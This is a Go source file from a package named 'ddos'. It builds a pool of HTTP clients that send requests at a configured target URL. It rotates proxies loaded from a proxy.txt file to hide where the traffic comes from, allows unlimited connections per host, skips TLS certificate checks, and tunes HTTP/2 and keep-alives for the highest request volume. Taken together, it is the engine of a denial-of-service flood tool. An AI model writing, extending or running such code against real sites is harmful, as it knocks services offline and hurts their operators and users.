package ddos

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/letgo/paths"
	"golang.org/x/net/http2"
)

// ClientPool manages a pool of pre-configured HTTP clients for connection reuse
type ClientPool struct {
	clients     []*http.Client
	transports  []*http.Transport
	index       int64 // Atomic counter for round-robin
	poolSize    int
	proxyList   []string
	rotateProxy bool
	useHTTP2    bool
	mu          sync.RWMutex

	// Statistics
	hits   int64
	misses int64
}

// PoolStats holds statistics about the connection pool
type PoolStats struct {
	TotalClients int
	ActiveClients int
	PoolHits     int64
	PoolMisses   int64
}

// NewClientPool creates a new connection pool with pre-configured clients
func NewClientPool(config DDoSConfig) (*ClientPool, error) {
	// Auto-load proxies from proxy/proxy.txt if ProxyList is empty
	proxyList := config.ProxyList
	if len(proxyList) == 0 {
		if loaded, err := loadProxiesFromFile(); err == nil && len(loaded) > 0 {
			proxyList = loaded
		}
	}

	// Auto-detect HTTP/2 support for HTTPS targets
	useHTTP2 := false
	if strings.HasPrefix(config.TargetURL, "https://") {
		useHTTP2 = true // Try HTTP/2 for HTTPS
	}

	pool := &ClientPool{
		poolSize:    50, // Default pool size
		proxyList:   proxyList,
		rotateProxy: config.RotateProxy,
		useHTTP2:    useHTTP2,
	}

	// Determine pool size (optimized for maximum efficiency)
	if config.RotateProxy && len(proxyList) > 0 {
		// If rotating proxies, create one client per proxy
		pool.poolSize = len(proxyList)
	}

	// Create clients
	pool.clients = make([]*http.Client, 0, pool.poolSize)
	pool.transports = make([]*http.Transport, 0, pool.poolSize)

	if config.RotateProxy && len(proxyList) > 0 {
		// Create one client per proxy (optimal for proxy rotation)
		for _, proxyURL := range proxyList {
			client, transport, err := createClientForProxy(config, proxyURL, useHTTP2)
			if err != nil {
				continue // Skip invalid proxies
			}
			pool.clients = append(pool.clients, client)
			pool.transports = append(pool.transports, transport)
		}
	} else {
		// Create pool of clients sharing same transport (or single proxy)
		var baseTransport *http.Transport
		if len(proxyList) > 0 && !config.RotateProxy {
			// Single proxy mode
			if parsedURL, err := url.Parse(proxyList[0]); err == nil {
				baseTransport = createHTTP1Transport(config, parsedURL, useHTTP2)
			}
		} else {
			// No proxy or direct connection
			baseTransport = createHTTP1Transport(config, nil, useHTTP2)
		}

		// Create multiple clients sharing the transport
		for i := 0; i < pool.poolSize; i++ {
			client := &http.Client{
				Transport: baseTransport,
				Timeout:   config.Timeout,
			}
			pool.clients = append(pool.clients, client)
			pool.transports = append(pool.transports, baseTransport)
		}
	}

	if len(pool.clients) == 0 {
		return nil, fmt.Errorf("failed to create any clients for pool")
	}

	return pool, nil
}

// GetClient returns the next client from the pool (round-robin)
func (p *ClientPool) GetClient() *http.Client {
	if len(p.clients) == 0 {
		atomic.AddInt64(&p.misses, 1)
		return nil
	}

	idx := atomic.AddInt64(&p.index, 1) - 1
	client := p.clients[int(idx)%len(p.clients)]
	atomic.AddInt64(&p.hits, 1)
	return client
}

// GetStats returns pool statistics
func (p *ClientPool) GetStats() PoolStats {
	p.mu.RLock()
	defer p.mu.RUnlock()

	return PoolStats{
		TotalClients:  len(p.clients),
		ActiveClients: len(p.clients), // All clients are considered active
		PoolHits:      atomic.LoadInt64(&p.hits),
		PoolMisses:    atomic.LoadInt64(&p.misses),
	}
}

// Close cleans up all connections in the pool
func (p *ClientPool) Close() {
	p.mu.Lock()
	defer p.mu.Unlock()

	for _, transport := range p.transports {
		if transport != nil {
			transport.CloseIdleConnections()
		}
	}
}

// createClientForProxy creates a client configured for a specific proxy
func createClientForProxy(config DDoSConfig, proxyURL string, useHTTP2 bool) (*http.Client, *http.Transport, error) {
	parsedURL, err := url.Parse(proxyURL)
	if err != nil {
		return nil, nil, fmt.Errorf("invalid proxy URL: %w", err)
	}

	var transport *http.Transport
	if useHTTP2 {
		transport, err = createHTTP2TransportForProxy(config, parsedURL)
		if err != nil {
			// Fallback to HTTP/1.1
			transport = createHTTP1Transport(config, parsedURL, false)
		}
	} else {
		transport = createHTTP1Transport(config, parsedURL, false)
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
	}

	return client, transport, nil
}

// createHTTP1Transport creates an HTTP/1.1 transport (optimized for maximum efficiency)
func createHTTP1Transport(config DDoSConfig, proxyURL *url.URL, useHTTP2 bool) *http.Transport {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	transport := &http.Transport{
		TLSClientConfig:       tlsConfig,
		MaxIdleConns:          1000, // High for better reuse
		MaxIdleConnsPerHost:   500,  // High for better reuse
		MaxConnsPerHost:       0,    // Unlimited connections per host
		IdleConnTimeout:       5 * time.Minute,
		DisableKeepAlives:      false, // Always reuse connections
		DisableCompression:     true,   // Disable compression for efficiency
		ResponseHeaderTimeout:  config.Timeout,
		ExpectContinueTimeout:  1 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   config.Timeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	if proxyURL != nil {
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	// Configure HTTP/2 if requested
	if useHTTP2 {
		if err := http2.ConfigureTransport(transport); err != nil {
			// HTTP/2 configuration failed, continue with HTTP/1.1
		}
	}

	return transport
}

// loadProxiesFromFile loads proxies from proxy/proxy.txt (auto-load helper)
func loadProxiesFromFile() ([]string, error) {
	dataDir := paths.GetDataDir()
	proxyFilePath := filepath.Join(dataDir, "proxy", "proxy.txt")
	
	file, err := os.Open(proxyFilePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// Skip empty lines and comments
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		proxies = append(proxies, line)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxies, nil
}

// createHTTP2TransportForProxy creates an HTTP/2 transport for a proxy
func createHTTP2TransportForProxy(config DDoSConfig, proxyURL *url.URL) (*http.Transport, error) {
	transport := createHTTP1Transport(config, proxyURL, true)

	// Configure HTTP/2
	if err := http2.ConfigureTransport(transport); err != nil {
		return nil, fmt.Errorf("failed to configure HTTP/2: %w", err)
	}

	return transport, nil
}

